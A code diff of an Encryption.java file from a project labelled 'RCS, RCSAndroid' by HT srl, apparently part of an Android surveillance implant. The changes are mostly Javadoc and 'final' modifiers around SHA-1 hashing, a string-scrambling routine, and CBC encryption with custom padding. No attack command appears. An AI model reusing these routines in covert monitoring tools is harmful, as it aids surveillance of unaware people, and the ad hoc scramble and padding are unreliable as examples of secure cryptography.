@@ -1,22 +1,21 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : Encryption.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI.crypto;
 
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
-import java.util.Arrays;
 
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.action.sync.CommandException;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
-//#preprocess
-/* *************************************************
- * Copyright (c) 2010 - 2010
- * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib
- * File         : Encryption.java
- * Created      : 26-mar-2010
- * *************************************************/
+// TODO: Auto-generated Javadoc
 
 /**
  * The Class Encryption.
@@ -24,6 +23,7 @@ import com.ht.RCSAndroidGUI.utils.Utils;
 public class Encryption {
 
 	// #ifdef DEBUG
+	/** The debug. */
 	private static Debug debug = new Debug("Encryption");
 
 	// #endif
@@ -82,6 +82,14 @@ public class Encryption {
 	 * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
 	 * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
 	 * a FALSE descrambla.
+	 * 
+	 * @param name
+	 *            the name
+	 * @param seed
+	 *            the seed
+	 * @param enc
+	 *            the enc
+	 * @return the string
 	 */
 	private static String scramble(final String name, int seed,
 			final boolean enc) {
@@ -132,6 +140,7 @@ public class Encryption {
 		return new String(retString);
 	}
 
+	/** The crypto. */
 	Crypto crypto;
 
 	/**
@@ -146,9 +155,14 @@ public class Encryption {
 	 * 
 	 * @param message
 	 *            the message
+	 * @param offset
+	 *            the offset
+	 * @param length
+	 *            the length
 	 * @return the byte[]
 	 */
-	public static byte[] SHA1(final byte[] message, int offset, int length) {
+	public static byte[] SHA1(final byte[] message, final int offset,
+			final int length) {
 		MessageDigest digest;
 		try {
 			digest = MessageDigest.getInstance("SHA-1");
@@ -156,25 +170,41 @@ public class Encryption {
 			final byte[] sha1 = digest.digest();
 
 			return sha1;
-		} catch (NoSuchAlgorithmException e) {
+		} catch (final NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		return null;
 	}
 
+	/**
+	 * SH a1.
+	 * 
+	 * @param message
+	 *            the message
+	 * @return the byte[]
+	 */
 	public static byte[] SHA1(final byte[] message) {
 		return SHA1(message, 0, message.length);
 	}
 
 	/**
 	 * Instantiates a new encryption.
+	 * 
+	 * @param key
+	 *            the key
 	 */
-	public Encryption(byte[] key) {
+	public Encryption(final byte[] key) {
 		makeKey(key);
 	}
-	
-	public void makeKey(byte[] key) {
+
+	/**
+	 * Make key.
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void makeKey(final byte[] key) {
 		crypto = new Crypto(key);
 	}
 
@@ -185,6 +215,7 @@ public class Encryption {
 	 *            the cyphered
 	 * @return the byte[]
 	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered) throws CryptoException {
 		return decryptData(cyphered, cyphered.length, 0);
@@ -199,6 +230,7 @@ public class Encryption {
 	 *            the offset
 	 * @return the byte[]
 	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered, final int offset)
 			throws CryptoException {
@@ -216,6 +248,7 @@ public class Encryption {
 	 *            the offset
 	 * @return the byte[]
 	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered, final int plainlen,
 			final int offset) throws CryptoException {
@@ -258,19 +291,27 @@ public class Encryption {
 		return plain;
 	}
 
-	public byte[] encryptData(final byte[] plain) {
-		return encryptData(plain, 0);
-	}
-
 	/**
-	 * Encrypt data in CBC mode and HT padding
+	 * Encrypt data.
 	 * 
 	 * @param plain
 	 *            the plain
 	 * @return the byte[]
 	 */
-	public byte[] encryptData(final byte[] plain, int offset) {
+	public byte[] encryptData(final byte[] plain) {
+		return encryptData(plain, 0);
+	}
 
+	/**
+	 * Encrypt data in CBC mode and HT padding.
+	 * 
+	 * @param plain
+	 *            the plain
+	 * @param offset
+	 *            the offset
+	 * @return the byte[]
+	 */
+	public byte[] encryptData(final byte[] plain, final int offset) {
 
 		final int len = plain.length - offset;
 
@@ -298,23 +339,40 @@ public class Encryption {
 	}
 
 	/**
-	 * Old style Pad, PKCS5 is available in EncryptionPKCS5
+	 * Old style Pad, PKCS5 is available in EncryptionPKCS5.
 	 * 
 	 * @param plain
+	 *            the plain
 	 * @param offset
+	 *            the offset
 	 * @param len
-	 * @return
+	 *            the len
+	 * @return the byte[]
 	 */
-	protected byte[] pad(byte[] plain, int offset, int len) {
+	protected byte[] pad(final byte[] plain, final int offset, final int len) {
 		return pad(plain, offset, len, false);
 	}
 
-	protected byte[] pad(byte[] plain, int offset, int len, boolean PKCS5) {
+	/**
+	 * Pad.
+	 * 
+	 * @param plain
+	 *            the plain
+	 * @param offset
+	 *            the offset
+	 * @param len
+	 *            the len
+	 * @param PKCS5
+	 *            the pKC s5
+	 * @return the byte[]
+	 */
+	protected byte[] pad(final byte[] plain, final int offset, final int len,
+			final boolean PKCS5) {
 		final int clen = getNextMultiple(len);
 		if (clen > 0) {
 			final byte[] padplain = new byte[clen];
 			if (PKCS5) {
-				int value = clen - len;
+				final int value = clen - len;
 				for (int i = 1; i <= value; i++) {
 					padplain[clen - i] = (byte) value;
 				}
@@ -344,6 +402,5 @@ public class Encryption {
 			pt[i] ^= iv[i];
 		}
 	}
-
 
 }
